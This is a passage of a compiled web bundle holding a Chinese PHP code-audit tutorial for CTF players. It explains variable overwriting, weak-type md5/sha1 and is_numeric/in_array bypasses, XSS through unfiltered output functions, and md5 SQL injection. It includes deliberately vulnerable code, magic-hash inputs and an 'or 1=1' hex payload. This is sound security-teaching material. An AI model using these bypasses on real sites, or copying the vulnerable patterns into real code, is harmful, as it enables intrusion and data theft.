\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u4f46\u5982\u679c\u4e0d\u6307\u5b9a\u524d\u7f00\uff0c\u6216\u8005\u6307\u5b9a\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u4f5c\u4e3a\u524d\u7f00\uff0c\u4f60\u5c06\u83b7\u5f97\u4e00\u4e2a E_NOTICE \u7ea7\u522b\u7684\u9519\u8bef\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $name = 'who';\n\timport_request_variables('gp');\n\tif($name == 'Ameng'){\n\t\techo $name;\n\t}\n\telse{\n\t\techo 'You are not Ameng';\n\t}\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c\u4ec0\u4e48\u53d8\u91cf\u4e5f\u4e0d\u4f20\uff0c\u90a3\u4e48\u9875\u9762\u5c06\u56de\u663e",(0,r.jsx)(n.code,{children:"You are not Ameng"}),"\u5982\u679c\u901a\u8fc7GET\u6216\u8005POST\u4f20\u5165",(0,r.jsx)(n.code,{children:"name=Ameng"}),"\u90a3\u4e48\u9875\u9762\u5c31\u4f1a\u56de\u663e",(0,r.jsx)(n.code,{children:"Ameng"})]}),"\n",(0,r.jsx)(n.p,{children:"\u53ef\u4ee5\u89c1\u5230\u6b64\u51fd\u6570\u8fd8\u662f\u5f88\u5371\u9669\u7684\uff0c\u6ca1\u6709\u4fee\u590d\u65b9\u6cd5\uff0c\u4e0d\u4f7f\u7528\u5c31\u662f\u6700\u597d\u7684\u65b9\u6cd5\u3002\u6240\u4ee5\u5728\u65b0\u7248\u672c\u7684 PHP \u4e2d\u5df2\u7ecf\u5e9f\u5f03\u4e86\u8fd9\u4e2a\u51fd\u6570\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"foreach",children:"foreach()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"foreach"})," \u8bed\u6cd5\u7ed3\u6784\u63d0\u4f9b\u4e86\u904d\u5386\u6570\u7ec4\u7684\u7b80\u5355\u65b9\u5f0f\u3002",(0,r.jsx)(n.code,{children:"foreach"})," \u4ec5\u80fd\u591f\u5e94\u7528\u4e8e\u6570\u7ec4\u548c\u5bf9\u8c61\uff0c\u5982\u679c\u5c1d\u8bd5\u5e94\u7528\u4e8e\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u6216\u8005\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u5c06\u53d1\u51fa\u9519\u8bef\u4fe1\u606f\u3002\u6709\u4e24\u79cd\u8bed\u6cd5\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"foreach (array_expression as $value)\n    statement\nforeach (array_expression as $key => $value)\n    statement\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e00\u79cd\u683c\u5f0f\u904d\u5386\u7ed9\u5b9a\u7684 array_expression \u6570\u7ec4\u3002\u6bcf\u6b21\u5faa\u73af\u4e2d\uff0c\u5f53\u524d\u5355\u5143\u7684\u503c\u88ab\u8d4b\u7ed9 $value \u5e76\u4e14\u6570\u7ec4\u5185\u90e8\u7684\u6307\u9488\u5411\u524d\u79fb\u4e00\u6b65\uff08\u56e0\u6b64\u4e0b\u4e00\u6b21\u5faa\u73af\u4e2d\u5c06\u4f1a\u5f97\u5230\u4e0b\u4e00\u4e2a\u5355\u5143\uff09\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u7b2c\u4e8c\u79cd\u683c\u5f0f\u505a\u540c\u6837\u7684\u4e8b\uff0c\u53ea\u662f\u9664\u4e86\u5f53\u524d\u5355\u5143\u7684\u952e\u540d\u4e5f\u4f1a\u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\u88ab\u8d4b\u7ed9\u53d8\u91cf $key\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u90a3\u4e48\u8fd9\u4e2a\u51fd\u6570\u5982\u4f55\u5b9e\u73b0\u53d8\u91cf\u7684\u8986\u76d6\u5462\uff1f\u6211\u4eec\u6765\u770b\u4e2a\u6848\u4f8b."}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $name = 'who';\n    foreach($_GET as $key => $value)\t{  \n            $$key = $value;  \n    }  \n    if($name == \"Ameng\"){\n        echo 'You are right!';\n    }\n\telse{\n        echo 'You are flase!';\n    }\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u90a3\u4e48\u6267\u884c\u7ed3\u679c\u662f\u600e\u6837\u7684\u5462\uff1f\u5f53\u6211\u4eec\u76f4\u63a5\u6253\u5f00\u9875\u9762\u7684\u65f6\u5019\u5b83\u4f1a\u8f93\u51fa",(0,r.jsx)(n.code,{children:"You are false!"}),",\u800c\u5f53\u6211\u4eec\u901a\u8fc7GET\u4f20\u53c2",(0,r.jsx)(n.code,{children:"name=Ameng"}),"\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u56de\u663e",(0,r.jsx)(n.code,{children:"You are right!"}),"\u3002\u90a3\u4e48\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5173\u952e\u70b9\u5c31\u5728\u4e8e",(0,r.jsx)(n.code,{children:"$$"}),"\u8fd9\u79cd\u5199\u6cd5\u3002\u8fd9\u79cd\u5199\u6cd5\u79f0\u4e3a\u53ef\u53d8\u53d8\u91cf\u3002\u4e00\u4e2a\u53d8\u91cf\u80fd\u591f\u83b7\u53d6\u4e00\u4e2a\u666e\u901a\u53d8\u91cf\u7684\u503c\u4f5c\u4e3a\u8fd9\u4e2a\u53ef\u53d8\u53d8\u91cf\u7684\u53d8\u91cf\u540d\u3002\u5f53\u4f7f\u7528",(0,r.jsx)(n.code,{children:"foreach"}),"\u6765\u904d\u5386\u6570\u7ec4\u4e2d\u7684\u503c\uff0c\u7136\u540e\u518d\u5c06\u83b7\u53d6\u5230\u7684\u6570\u7ec4\u952e\u540d\u4f5c\u4e3a\u53d8\u91cf\uff0c\u6570\u7ec4\u4e2d\u7684\u952e\u503c\u4f5c\u4e3a\u53d8\u91cf\u7684\u503c\u3002\u8fd9\u6837\u5c31\u4ea7\u751f\u4e86\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\uff0c\u5982\u4e0a\u4ee3\u7801\u793a\u4f8b\u3002\u5176\u6267\u884c\u8fc7\u7a0b\u4e3a",(0,r.jsx)(n.code,{children:"$$key"}),"=",(0,r.jsx)(n.code,{children:"$name"}),"\uff0c\u6700\u540e\u8d4b\u503c\u4e3a",(0,r.jsx)(n.code,{children:"$value"}),"\uff0c\u4ece\u800c\u5b9e\u73b0\u4e86\u53d8\u91cf\u8986\u76d6\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"\u5f31\u7c7b\u578b\u6bd4\u8f83",children:"\u5f31\u7c7b\u578b\u6bd4\u8f83"}),"\n",(0,r.jsx)(n.h4,{id:"md5\u51fd\u6570\u548csha1\u7ed5\u8fc7",children:"md5()\u51fd\u6570\u548csha1()\u7ed5\u8fc7"}),"\n",(0,r.jsx)(n.p,{children:"\u5173\u4e8e\u8fd9\u4e24\u4e2a\u51fd\u6570\u60f3\u5fc5\u6211\u4eec\u4e0d\u964c\u751f\uff0c\u65e0\u8bba\u662f\u5728\u5b9e\u9645\u4ee3\u7801\u5ba1\u8ba1\u4e2d\uff0c\u8fd8\u662f\u5728CTF\u6bd4\u8d5b\u4e2d\uff0c\u8fd9\u4e9b\u6211\u4eec\u90fd\u662f\u78b0\u5230\u8fc7\u7684\u51fd\u6570\u3002\u90a3\u4e48\u5f53\u6211\u4eec\u9047\u5230\u7528\u8fd9\u4e24\u4e2a\u51fd\u6570\u6765\u5224\u65ad\u7684\u65f6\u5019\uff0c\u5982\u679c\u7ed5\u8fc7\u5462\uff1f"}),"\n",(0,r.jsxs)(n.p,{children:["PHP \u5728\u5904\u7406\u54c8\u5e0c\u5b57\u7b26\u4e32\u7684\u65f6\u5019\uff0c\u4f1a\u4f7f\u7528",(0,r.jsx)(n.code,{children:"!="}),"\u6216\u8005",(0,r.jsx)(n.code,{children:"=="}),"\u6765\u5bf9\u54c8\u5e0c\u503c\u8fdb\u884c\u6bd4\u8f83\uff0c\u5b83\u4f1a\u628a\u6bcf\u4e00\u4e2a",(0,r.jsx)(n.code,{children:"0E"}),"\u5f00\u5934\u7684\u54c8\u5e0c\u503c\u90fd\u89e3\u91ca\u4e3a0\uff0c\u90a3\u4e48\u8fd9\u4e2a\u65f6\u5019\u95ee\u9898\u5c31\u6765\u4e86\uff0c\u5982\u679c\u4e24\u4e2a\u4e0d\u540c\u7684\u503c\uff0c\u7ecf\u8fc7\u54c8\u5e0c\u4ee5\u540e\u5b83\u4eec\u90fd\u53d8\u6210\u4e86",(0,r.jsx)(n.code,{children:"0E"}),"\u5f00\u5934\u7684\u54c8\u5e0c\u503c\uff0c\u90a3\u4e48 PHP \u5c31\u4f1a\u5c06\u5b83\u4eec\u89c6\u4f5c\u76f8\u7b49\u5904\u7406\u3002\u90a3\u4e48",(0,r.jsx)(n.code,{children:"0E"}),"\u5f00\u5934\u7684\u54c8\u5e0c\u503c\u6709\u54ea\u4e9b\u5462\uff1f"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-text",children:"s878926199a\n0e5459932745177090343288558410s155964671a\n0e3427684168224515249741172544s214587387a\n0e8482404488305379244658656119s214587387a\n0e8482404488305379244658656119s878926199a\n0e5459932745177090343288558410s1091221200a\n0e9406242178565615578163273846s1885207154a\n0e5093672134182067008420087635s1502113478a\n0e8615801632915612474043813960s1885207154a\n0e5093672134182067008420087635s1836677006a\n0e4810364908676611132600349007s155964671a\n0e3427684168224515249741172544s1184209335a\n0e0724858203927733895231090820s1665632922a\n0e7311980614911630731971283637s1502113478a\n0e8615801632915612474043813960s1836677006a\n0e4810364908676611132600349007s1091221200a\n0e9406242178565615578163273846s155964671a\n0e3427684168224515249741172544s1502113478a\n0e8615801632915612474043813960s155964671a\n0e3427684168224515249741172544s1665632922a\n0e7311980614911630731971283637s155964671a\n0e3427684168224515249741172544s1091221200a\n0e9406242178565615578163273846s1836677006a\n0e4810364908676611132600349007s1885207154a\n0e5093672134182067008420087635s532378020a\n0e2204630958555115075880412058s878926199a\n0e5459932745177090343288558410s1091221200a\n0e9406242178565615578163273846s214587387a\n0e8482404488305379244658656119s1502113478a\n0e8615801632915612474043813960s1091221200a\n0e9406242178565615578163273846s1665632922a\n0e7311980614911630731971283637s1885207154a\n0e5093672134182067008420087635s1836677006a\n0e4810364908676611132600349007s1665632922a\n0e7311980614911630731971283637s878926199a\n0e5459932745177090343288558410\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6765\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5427"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $a = $_GET['a'];\n\t$b = $_GET['b'];\n\tif($a != $b && md5($a) == md5($b)){\n        echo '\u8fd9\u5c31\u662f\u5f31\u7c7b\u578b\u7ed5\u8fc7';\n    }\n\telse{\n        echo '\u518d\u601d\u8003\u4e00\u4e0b';\n    }\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u4ece\u4e0a\u9762\u6211\u7ed9\u51fa\u7684\u54ea\u4e9b\u503c\u4e2d\uff0c\u6311\u4e24\u4e2a\u4e0d\u540c\u7684\u503c\u4f20\u5165\u53c2\u6570\uff0c\u5c31\u80fd\u770b\u5230\u76f8\u5e94\u7684\u7ed3\u679c"}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0a\u9762\u662f",(0,r.jsx)(n.code,{children:"md5()"}),"\u51fd\u6570\u7684\u7ed5\u8fc7\u59ff\u52bf\uff0c\u90a3\u4e48",(0,r.jsx)(n.code,{children:"sha1()"}),"\u5982\u4f55\u7ed5\u8fc7\u5462\uff1f\u518d\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $a = $_GET['a'];\n\t$b = $_GET['b'];\n\tif(isset($a,$b)){\n\t\tif(sha1($a) === sha1($b)){\n\t\t\techo 'nice!!!';\n\t\t}\n\t\telse{\n\t\t\techo 'Try again!';\n\t\t}\n\t}\n?>\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5f53\u6211\u4eec\u4f20\u5165",(0,r.jsx)(n.code,{children:"a[]=1&b[]=2"}),"\u7684\u65f6\u5019\uff0c\u867d\u7136\u5b83\u4f1a\u7ed9\u51fa\u8b66\u544a\uff0c\u8bf4\u6211\u4eec\u5e94\u8be5\u4f20\u5165\u5b57\u7b26\u4e32\u800c\u4e0d\u5e94\u8be5\u662f\u6570\u7ec4\uff0c\u4f46\u662f\u5b83\u8fd8\u662f\u8f93\u51fa\u4e86",(0,r.jsx)(n.code,{children:"nice!!!"}),"\uff0c\u6240\u4ee5\u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u7528\u6570\u5b57\u6765\u7ed5\u8fc7",(0,r.jsx)(n.code,{children:"sha1()"}),"\u51fd\u6570\u7684\u6bd4\u8f83\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"is_numeric\u7ed5\u8fc7",children:"is_numeric()\u7ed5\u8fc7"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\u3002\u6b64\u51fd\u6570\u662f\u68c0\u6d4b\u53d8\u91cf\u662f\u5426\u4e3a\u6570\u5b57\u6216\u8005\u6570\u5b57\u5b57\u7b26\u4e32"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"is_numeric( mixed $var) : bool\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c",(0,r.jsx)(n.code,{children:"var"}),"\u662f\u6570\u5b57\u6216\u8005\u6570\u5b57\u5b57\u7b26\u4e32\u90a3\u4e48\u5c31\u8fd4\u56deTRUE\uff0c\u5426\u5219\u5c31\u8fd4\u56deFALSE\u3002\u90a3\u4e48\u8fd9\u91cc\u8bf4\u7684\u7ed5\u8fc7\u662f\u4ec0\u4e48\u59ff\u52bf\u5462\uff1f\u662f\u5341\u516d\u8fdb\u5236\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n    $a = is_numeric('0x31206f722031');\n\tif($a){\n        echo 'It meets my requirement';\n    }\n\telse{\n        echo 'Try again';\n    }\n?>\n\u6267\u884c\u7ed3\u679c\u2014\u2014>\nIt meets my requirement\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u8fd9\u91cc\u8bf4\u4e00\u4e0b",(0,r.jsx)(n.code,{children:"0x31206f722031"}),"\u8fd9\u4e2a\u662f\u4ec0\u4e48\uff1f\u8fd9\u4e2a\u662f",(0,r.jsx)(n.code,{children:"or 1=1"}),"\u7684\u5341\u516d\u8fdb\u5236\uff0c\u4ece\u8fd9\u91cc\u53ef\u4ee5\u770b\u51fa\uff0c\u5982\u679c\u67d0\u5904\u4f7f\u7528\u4e86\u6b64\u51fd\u6570\uff0c\u5e76\u5c06\u4fee\u9970\u540e\u7684\u53d8\u91cf\u5e26\u5165\u6570\u636e\u5e93\u67e5\u8be2\u8bed\u53e5\u4e2d\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u80fd\u5229\u7528\u6b64\u6f0f\u6d1e\u5b9e\u73b0sql\u6ce8\u5165\u3002\u540c\u6837\u7684\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u518dCTF\u6bd4\u8d5b\u4e2d\u4e5f\u662f\u5f88\u5e38\u89c1\u7684\u3002"]}),"\n",(0,r.jsx)(n.h4,{id:"in_array\u7ed5\u8fc7",children:"in_array()\u7ed5\u8fc7"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u7528\u6765\u68c0\u6d4b\u6570\u7ec4\u4e2d\u662f\u5426\u5b58\u5728\u67d0\u4e2a\u503c\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool\n"})}),"\n",(0,r.jsx)(n.h5,{id:"\u53c2\u6570-28",children:"\u53c2\u6570"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"needle\uff1a\u5e26\u641c\u7d22\u7684\u503c(\u533a\u5206\u5927\u5c0f\u5199)\u3002"}),"\n",(0,r.jsx)(n.li,{children:"haystack\uff1a\u5e26\u641c\u7d22\u7684\u6570\u7ec4\u3002"}),"\n",(0,r.jsxs)(n.li,{children:["strict\uff1a\u82e5\u6b64\u53c2\u6570\u7684\u503c\u4e3aTRUE\uff0c\u90a3\u4e48",(0,r.jsx)(n.code,{children:"in_array()"}),"\u51fd\u6570\u5c06\u4f1a\u68c0\u67e5needle\u7684\u7c7b\u578b\u662f\u5426\u548chaystack\u4e2d\u7684\u7c7b\u578b\u76f8\u540c\u3002"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u6709\u65f6\u5019\u6211\u4eec\u518d\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\u7684\u65f6\u5019\uff0c\u4ee3\u7801\u53ef\u80fd\u4f1a\u8fc7\u6ee4\u67d0\u4e9b\u654f\u611f\u5b57\u7b26\u4e32\uff0c\u4f46\u662f\u6211\u4eec\u53c8\u9700\u8981\u4f20\u5165\u8fd9\u6837\u7684\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u5982\u4f55\u7ed5\u8fc7\u5b83\u7684\u68c0\u6d4b\u5462\uff1f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:'<?php\n    $myarr = array(\'Ameng\');\n\t$needle = 0;\n\tif(in_array($needle,$myarr)){\n        echo "It\'s in array";\n    }\n\telse{\n        echo "not in array";\n    }\n?>\n'})}),"\n",(0,r.jsxs)(n.p,{children:["\u4e0a\u9762\u4ee3\u7801\u793a\u4f8b\u6267\u884c\u7684\u7ed3\u679c\u4f1a\u662f\u4ec0\u4e48\u5462\uff1f\u4ece\u7b80\u5355\u7684\u903b\u8f91\u4e0a\u5206\u6790\u30020\u662f\u4e0d\u5b58\u5728\u8981\u641c\u7d22\u7684\u6570\u7ec4\u4e2d\u7684\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\uff0c\u5e94\u8be5\u662f\u8f93\u51fa",(0,r.jsx)(n.code,{children:"not in array"}),"\uff0c\u4f46\u662f\u5b9e\u9645\u5374\u8f93\u51fa\u4e86",(0,r.jsx)(n.code,{children:"It's in array"}),"\u3002\u8fd9\u662f\u4e3a\u4ec0\u4e48\u5462\uff1f\u539f\u56e0\u5c31\u5728\u4e8ePHP\u7684\u9ed8\u8ba4\u7c7b\u578b\u8f6c\u6362\u3002\u8fd9\u91cc\u6211\u4eec\u7b2c\u4e09\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u8bbe\u7f6e\u4e3a",(0,r.jsx)(n.code,{children:"true"}),"\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f\u975e\u4e25\u683c\u6bd4\u8f83\uff0c\u6240\u4ee5\u5728\u6570\u5b57\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u6bd4\u8f83\u65f6\uff0c\u5b57\u7b26\u4e32\u5148\u88ab\u5f3a\u5236\u8f6c\u6362\u6210\u6570\u5b57\uff0c\u7136\u540e\u518d\u8fdb\u884c\u6bd4\u8f83\u3002\u5e76\u4e14\u56e0\u4e3a\u67d0\u4e9b\u7c7b\u578b\u8f6c\u6362\u6b63\u5728\u53d1\u751f\uff0c\u5c31\u4f1a\u5bfc\u81f4\u53d1\u751f\u6570\u636e\u4e22\u5931\uff0c\u5e76\u4e14\u90fd\u88ab\u89c6\u4e3a\u76f8\u540c\u3002\u6240\u4ee5\u5f52\u6839\u5230\u5e95\u8fd8\u662f\u975e\u4e25\u683c\u6bd4\u8f83\u5bfc\u81f4\u7684\u95ee\u9898\u3002\u6240\u4ee5\u518d\u9047\u5230\u8fd9\u4e2a\u51fd\u6570\u7528\u6765\u53d8\u91cf\u68c0\u6d4b\u7684\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u770b\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5426\u5f00\u542f\uff0c\u82e5\u672a\u5f00\u542f\uff0c\u5219\u5b58\u5728\u6570\u7ec4\u7ed5\u8fc7\u3002"]}),"\n",(0,r.jsx)(n.h3,{id:"xss",children:"XSS"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fd9\u91cc\u9996\u5148\u4f60\u8981\u5bf9XSS\u7684\u57fa\u672c\u539f\u7406\u8981\u77e5\u9053\u3002PHP\u4e2d\u4e00\u4e0b\u8fd9\u4e9b\u51fd\u6570\u4e4b\u6240\u4ee5\u4f1a\u51fa\u73b0XSS\u7684\u6f0f\u6d1e\u60c5\u51b5\uff0c\u4e3b\u8981\u8fd8\u662f\u6ca1\u6709\u5bf9\u8f93\u51fa\u7684\u53d8\u91cf\u8fdb\u884c\u8fc7\u6ee4\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"print",children:"print()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\tprint($str);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648347.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"print_r",children:"print_r()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\tprint_r($str);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648347.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"echo",children:"echo()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\techo \"$str\";\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u4f20\u5165\u76f8\u5e94\u53c2\u6570\uff0c\u6267\u884c\u7ed3\u679c\u5982\u4e0b\uff1a"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648347.png",alt:"img"})}),"\n",(0,r.jsx)(n.h4,{id:"printf",children:"printf()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\tprintf($str);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6267\u884c\u7ed3\u679c\u548c\u4e0a\u9762\u76f8\u540c\uff0c\u6211\u5c31\u4e0d\u518d\u8d34\u56fe\u7247\u4e86\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"sprintf",children:"sprintf()"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\t$a = sprintf($str);\n\techo \"$a\";\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"die",children:"die()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u8f93\u51fa\u4e00\u6761\u4fe1\u606f\uff0c\u5e76\u9000\u51fa\u5f53\u524d\u811a\u672c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\tdie($str);\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"var_dump",children:"var_dump()"}),"\n",(0,r.jsx)(n.p,{children:"\u6b64\u51fd\u6570\u6253\u5370\u53d8\u91cf\u7684\u76f8\u5173\u4fe1\u606f\uff0c\u7528\u6765\u663e\u793a\u5173\u4e8e\u4e00\u4e2a\u6216\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u5305\u62ec\u8868\u8fbe\u5f0f\u7684\u7c7b\u578b\u4e0e\u503c\u3002\u6570\u7ec4\u5c06\u9012\u5f52\u5c55\u5f00\u4e4b\uff0c\u901a\u8fc7\u7f29\u8fdb\u663e\u793a\u5176\u7ed3\u6784\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\t$a = array($str);\n\tvar_dump($a);\n?>\n"})}),"\n",(0,r.jsx)(n.h4,{id:"var_export",children:"var_export()"}),"\n",(0,r.jsxs)(n.p,{children:["\u6b64\u51fd\u6570\u8f93\u51fa\u6216\u8005\u8fd4\u56de\u4e00\u4e2a\u53d8\u91cf\u7684\u5b57\u7b26\u4e32\u8868\u793a\u3002\u5b83\u8fd4\u56de\u5173\u4e8e\u4f20\u9012\u7ed9\u8be5\u51fd\u6570\u7684\u53d8\u91cf\u7684\u7ed3\u6784\u4fe1\u606f\uff0c\u548c",(0,r.jsx)(n.code,{children:"var_dump"}),"\u7c7b\u4f3c\uff0c\u4e0d\u540c\u7684\u662f\u5176\u8fd4\u56de\u7684\u8868\u793a\u662f\u5408\u6cd5\u7684 PHP \u4ee3\u7801\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"<?php\n\t$str = $_GET['x'];\n\t$a = array($str);\n\tvar_export($a);\n?>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{src:"https://cdn.wjlin0.com/img/202508191648348.png",alt:"img"})}),"\n",(0,r.jsx)(n.h3,{id:"php\u9ed1\u9b54\u6cd5",children:"PHP\u9ed1\u9b54\u6cd5"}),"\n",(0,r.jsx)(n.p,{children:"\u8fd9\u91cc\u5927\u90e8\u5206\u51fd\u6570\u7684\u4f7f\u7528\u5df2\u7ecf\u5728\u4e0a\u9762\u8be6\u7ec6\u4ecb\u7ecd\u8fc7\u4e86\uff0c\u8fd9\u91cc\u6211\u5c31\u9488\u5bf9\u6bcf\u4e00\u79cd\u51fd\u6570\u5927\u6982\u4ecb\u7ecd\u4e00\u4e0b\u5176\u4e3b\u8981\u5b58\u5728\u7684\u5229\u7528\u65b9\u6cd5\u3002"}),"\n",(0,r.jsx)(n.h4,{id:"md5",children:"md5()"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.code,{children:"md5()"}),"\u51fd\u6570\u7ed5\u8fc7sql\u6ce8\u5165\u3002\u6211\u4eec\u6765\u770b\u4e00\u4e2a\u4f8b\u5b50\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u4ee3\u7801\u793a\u4f8b\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",children:"$password=$_POST['password'];\n$sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n$result=mysqli_query($link,$sql);\nif(mysqli_num_rows($result)>0){\n    echo 'flag is :'.$flag;\n}\nelse{\n    echo 